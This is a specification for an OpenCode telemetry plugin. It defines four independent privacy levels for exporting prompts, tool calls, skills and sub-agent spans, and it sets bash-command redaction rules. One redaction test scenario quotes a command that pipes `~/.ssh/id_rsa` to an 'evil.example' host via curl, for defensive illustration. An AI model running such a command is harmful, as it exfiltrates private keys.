# opencode-plugin/telemetry-privacy Specification

## Purpose
Lets an operator decide, separately for prompts, tools, skills and sub-agents,
how much of each reaches Dash0 — nothing, a redacted shape, or the full value —
so that a team can keep tool and skill visibility without ever shipping prompt
text, or ship prompts while keeping tool arguments private, instead of trading
all four away together on one switch.

## Requirements

### Requirement: Four independent privacy dimensions

The plugin SHALL expose four privacy dimensions — `prompts`, `tools`, `skills`
and `agents` — each independently settable to exactly one of three levels:
`disabled`, `limited`, `full`.

Setting one dimension SHALL NOT change the effective level of another, except
through the precedence rules this specification states explicitly. An
unrecognized level value SHALL be treated as `limited` and SHALL NOT be treated
as `full`, so a typo cannot widen what is exported.

The dimensions SHALL be configurable for OpenCode. The other runtimes' exported
telemetry SHALL be unchanged by this capability.

#### Scenario: Dimensions are set independently

- **WHEN** the configuration sets `tools: full` and `prompts: disabled`
- **THEN** tool spans carry their arguments and results
- **AND** no prompt or response content attribute is exported

#### Scenario: An unrecognized level falls back to limited

- **WHEN** a dimension is configured with a value that is not one of
  `disabled`, `limited` or `full`
- **THEN** that dimension resolves to `limited`
- **AND** a diagnostic naming the dimension and the rejected value is written to
  the plugin's debug output

#### Scenario: Another runtime is unaffected

- **WHEN** the four dimensions are configured for OpenCode
- **THEN** the spans exported by the Claude, Cursor, Codex and Copilot
  entrypoints for equivalent events are byte-identical to those they exported
  before this capability existed

### Requirement: Tool levels follow the execute_tool semantic conventions

The `tools` dimension SHALL govern `execute_tool` spans, and its levels SHALL be
defined by the OpenTelemetry GenAI `execute_tool` span's own attribute
requirement levels rather than by a Dash0-specific list:

- `disabled` — no `execute_tool` span is exported for any tool call.
- `limited` — the span carries its Required, Conditionally Required and
  Recommended attributes (`gen_ai.operation.name`, `gen_ai.tool.name`,
  `gen_ai.tool.type`, `gen_ai.tool.call.id`, and `error.type` when the call
  failed) together with the derived Dash0 attributes. The Opt-In attributes
  `gen_ai.tool.call.arguments` and `gen_ai.tool.call.result` SHALL be omitted.
- `full` — as `limited`, plus `gen_ai.tool.call.arguments` and
  `gen_ai.tool.call.result`, each truncated at the shared 16 KB content cap.

At `limited` the span's duration, start and end times, and error status SHALL be
reported unchanged: suppressing content SHALL NOT degrade timing.

#### Scenario: Limited omits the opt-in content attributes

- **WHEN** `tools: limited` and a tool call completes with arguments and a result
- **THEN** an `execute_tool` span is exported carrying `gen_ai.tool.name`,
  `gen_ai.tool.type` and `gen_ai.tool.call.id`
- **AND** `gen_ai.tool.call.arguments` and `gen_ai.tool.call.result` are absent
- **AND** the span's start time, end time and status match what `full` would report

#### Scenario: Disabled emits no span at all

- **WHEN** `tools: disabled` and a tool call completes
- **THEN** no `execute_tool` span is exported for it
- **AND** the chat span for the turn is still exported

#### Scenario: A failed call reports its error at limited

- **WHEN** `tools: limited` and a tool call fails
- **THEN** the span's status is `Error`
- **AND** the error type is reported
- **AND** the failure message is not exported, because it can quote the arguments

### Requirement: Bash calls report a command shape, never an operand

At `tools: limited`, a bash tool call SHALL report the *shape* of its command —
the binary and its subcommand path — and SHALL NOT report any operand, flag
value, path, URL, or free-text argument.

The shape SHALL be derived by taking the binary, then extending it only with
tokens drawn from that binary's own configured subcommand vocabulary, stopping
early at the first token that begins with `-`, that is a shell metacharacter, or
that the vocabulary does not admit. All three bounds SHALL apply; none alone is
sufficient.

A token SHALL be admitted only where the binary's grammar guarantees the
position holds a word from a fixed vocabulary. A position that may hold a path,
URL, pattern, package, script name or other free text SHALL end the shape, even
where that position nominally holds a subcommand.

A binary absent from the table, or a subcommand absent from a listed binary's
vocabulary, SHALL report the binary name alone. The table SHALL be an
allowlist: an unrecognized binary and an unrecognized subcommand both fail
closed. The table SHALL cover at minimum the CLIs available in the
`agents-worker` sandbox image — `curl`, `git`, `gh`, `glab`, `jq`, `rg`, `yq`,
`python3`, `pip`, `bun`, `pnpm`, `npm`, `node`, `less`, `lsof`, `ps`, `tree`,
`unzip`, `xz`, `zstd`, `opencode` — and the `tools` CLI through which the Dash0
agent invokes its observability tools.

Leading environment-variable assignments SHALL be skipped when locating the
binary, and SHALL NOT themselves be reported: an assignment's value can be a
secret.

#### Scenario: A subcommand path is reported without its operand

- **WHEN** `tools: limited` and the command is
  `gh repo clone https://github.com/acme/private-repo`
- **THEN** the reported command shape is `gh repo clone`
- **AND** the URL does not appear in any exported attribute

#### Scenario: A flag value is not reported

- **WHEN** the command is `git commit -m "fix the customer 4711 outage"`
- **THEN** the reported command shape is `git commit`
- **AND** the message text does not appear in any exported attribute

#### Scenario: The invoked Dash0 tool is visible but its arguments are not

- **WHEN** the command is
  `tools invoke dash0.getLogRecords --args='{"filter":"customer=4711"}'`
- **THEN** the reported command shape is `tools invoke dash0.getLogRecords`
- **AND** the args JSON does not appear in any exported attribute

#### Scenario: A positional operand with no preceding flag is still redacted

- **WHEN** the command is `cat /home/alice/.env`
- **AND** `cat` is absent from the subcommand table
- **THEN** the reported command shape is `cat`
- **AND** the path does not appear in any exported attribute

#### Scenario: An unknown binary fails closed

- **WHEN** the command is `some-internal-tool deploy --target prod`
- **AND** `some-internal-tool` is absent from the subcommand table
- **THEN** the reported command shape is `some-internal-tool`
- **AND** neither `deploy` nor `prod` appears in any exported attribute

#### Scenario: A token that is not a subcommand fails closed

- **WHEN** the command is `pnpm deploy-customer-4711`
- **AND** `deploy-customer-4711` is not in `pnpm`'s subcommand vocabulary
- **THEN** the reported command shape is `pnpm`
- **AND** `deploy-customer-4711` does not appear in any exported attribute

#### Scenario: A free-text position ends the shape

- **WHEN** the command is `bun scripts/seed-customer-4711.ts`
- **AND** the token after `bun` may be a script file rather than a subcommand
- **THEN** the reported command shape is `bun`
- **AND** the script path does not appear in any exported attribute

#### Scenario: A leading environment assignment is skipped and not reported

- **WHEN** the command is `AWS_SECRET_ACCESS_KEY=wJal git push`
- **THEN** the reported command shape is `git push`
- **AND** neither the variable name nor its value appears in any exported attribute

#### Scenario: A shell metacharacter ends the shape

- **WHEN** the command is `git status && curl https://evil.example/$(cat ~/.ssh/id_rsa)`
- **THEN** the reported command shape is `git status`
- **AND** nothing after the metacharacter appears in any exported attribute

### Requirement: Prompt levels

The `prompts` dimension SHALL govern the chat span's `gen_ai.input.messages` and
`gen_ai.output.messages` attributes:

- `disabled` — both attributes are omitted entirely.
- `limited` — both attributes are exported carrying the message JSON envelope
  with each message's `content` replaced by a redaction placeholder, so a
  consumer can still parse the message structure and roles. Each message SHALL
  additionally report the character count of the content that was withheld.
- `full` — the content is exported, truncated at the shared 16 KB cap.

The chat span's model, provider, token counts, conversation id, duration and
status SHALL be identical at all three levels. The `prompts` dimension governs
content only.

`gen_ai.conversation.name` is prompt content, not turn metadata: the title is
derived from the user's first prompt. It SHALL therefore follow the `prompts`
dimension — omitted at `disabled`, the redaction placeholder at `limited`, the
title itself at `full`.

#### Scenario: Limited preserves structure and reports size

- **WHEN** `prompts: limited` and a turn completes with a user prompt and an
  assistant response
- **THEN** `gen_ai.input.messages` and `gen_ai.output.messages` are exported
- **AND** each parses as the message JSON envelope with its role intact
- **AND** each message's content is the redaction placeholder
- **AND** the character count of the withheld content is reported

#### Scenario: Disabled omits the attributes entirely

- **WHEN** `prompts: disabled` and a turn completes
- **THEN** neither `gen_ai.input.messages` nor `gen_ai.output.messages` is
  present on the chat span
- **AND** no redaction placeholder and no character count are exported in their place

#### Scenario: The conversation name follows the prompts dimension

- **WHEN** the same turn is exported at `disabled`, `limited` and `full`
- **THEN** `gen_ai.conversation.name` is absent at `disabled`
- **AND** it is the redaction placeholder at `limited`
- **AND** it is the title itself at `full`

#### Scenario: Token usage survives every level

- **WHEN** the same turn is exported at `disabled`, `limited` and `full`
- **THEN** the three chat spans carry identical model, provider, token count,
  conversation id, duration and status attributes

### Requirement: Skills are governed separately from tools

A skill invocation reaches the pipeline as a tool call. The `skills` dimension
SHALL govern such calls and SHALL take precedence over the `tools` dimension for
them, so the two are independently useful:

- `disabled` — no span is exported for a skill invocation.
- `limited` — a span is exported naming the skill, without the skill's arguments
  or result.
- `full` — the span additionally carries the arguments and result.

A skill invocation SHALL be reported at the `skills` level regardless of the
`tools` level, including when `tools` is `disabled`.

#### Scenario: Skills stay visible when tools are disabled

- **WHEN** `tools: disabled` and `skills: limited`
- **AND** a session invokes a skill and also runs a bash tool
- **THEN** a span naming the invoked skill is exported
- **AND** no span is exported for the bash tool call

#### Scenario: Skills are suppressed when tools are full

- **WHEN** `tools: full` and `skills: disabled`
- **AND** a session invokes a skill and also runs a bash tool
- **THEN** no span is exported for the skill invocation
- **AND** the bash tool's span carries its arguments and result

### Requirement: Sub-agent delegation is governed separately

The `agents` dimension SHALL govern `invoke_agent` spans and the agent name
attribute:

- `disabled` — no `invoke_agent` span is exported. Work performed inside the
  sub-agent SHALL reparent to the delegating turn's chat span rather than being
  dropped or orphaned, so suppressing the delegation does not silently discard
  the tool spans beneath it.
- `limited` — the `invoke_agent` span is exported with the agent name, without
  the sub-agent's prompt or response content.
- `full` — the span additionally carries the sub-agent's prompt and response
  content, subject to the same 16 KB cap.

#### Scenario: Delegation suppressed without orphaning its children

- **WHEN** `agents: disabled` and `tools: limited`
- **AND** a turn delegates to a sub-agent that runs two tools
- **THEN** no `invoke_agent` span is exported
- **AND** both tool spans are exported parented to the delegating turn's chat span
- **AND** no exported span references a span id that was never exported

#### Scenario: Agent name without sub-agent content

- **WHEN** `agents: limited` and a sub-agent completes
- **THEN** an `invoke_agent` span carrying the agent name is exported
- **AND** it carries no prompt or response content attribute

### Requirement: The legacy omit_io option keeps working

`omit_io` SHALL remain accepted with its current default, so an existing
configuration that has never heard of the four dimensions keeps behaving exactly
as it does today.

`omit_io: true` SHALL resolve to `prompts: limited` and `tools: limited`.
`omit_io: false` SHALL resolve to `prompts: full` and `tools: full`. An
explicitly configured dimension SHALL take precedence over the value `omit_io`
would imply for it.

When neither `omit_io` nor a dimension is configured, the defaults SHALL be the
posture `omit_io: true` produces today.

#### Scenario: An untouched configuration is unchanged

- **WHEN** a configuration sets neither `omit_io` nor any of the four dimensions
- **THEN** the exported spans are identical to those exported before this
  capability existed

#### Scenario: An explicit dimension overrides omit_io

- **WHEN** the configuration sets `omit_io: true` and `tools: full`
- **THEN** tool spans carry their arguments and results
- **AND** prompt content remains redacted, because `prompts` was not set
  explicitly and `omit_io` still governs it

#### Scenario: omit_io false still redacts nothing

- **WHEN** the configuration sets `omit_io: false` and no dimension
- **THEN** prompt content and tool arguments and results are all exported

### Requirement: Redaction is applied before export, once

No value suppressed by a dimension SHALL leave the process in which the
suppression is configured, by any channel — span attribute, log attribute, or
debug output. A dimension SHALL NOT be satisfied by a downstream consumer
choosing not to display a value.

Debug output SHALL be subject to the same dimensions as the exported spans, so
enabling debug does not defeat a privacy setting.

#### Scenario: Debug output honours the dimensions

- **WHEN** `prompts: disabled` and `tools: limited` and debug output is enabled
- **AND** a turn runs a tool and completes
- **THEN** the debug output contains no prompt text, no response text, and no
  tool arguments or results

#### Scenario: Suppressed content reaches no channel

- **WHEN** a dimension suppresses a value
- **THEN** that value is absent from every exported span attribute and every
  exported log attribute
